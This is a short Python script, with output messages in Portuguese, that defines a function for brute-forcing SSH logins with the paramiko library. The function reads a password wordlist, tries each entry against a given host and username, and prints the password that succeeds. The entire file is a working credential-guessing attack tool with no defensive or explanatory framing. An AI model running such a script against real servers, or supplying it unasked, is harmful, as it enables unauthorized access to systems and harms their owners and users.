import paramiko

def ssh_brute_force(host, user, wordlist_path):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(wordlist_path, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            try:
                client.connect(host, username=user, password=password, timeout=3)
                print(f"[+] Sucesso! Usuário: {user} | Senha: {password}")
                return
            except:
                print(f"[-] Tentativa falhou: {password}")
    print("[-] Todas as senhas falharam.")
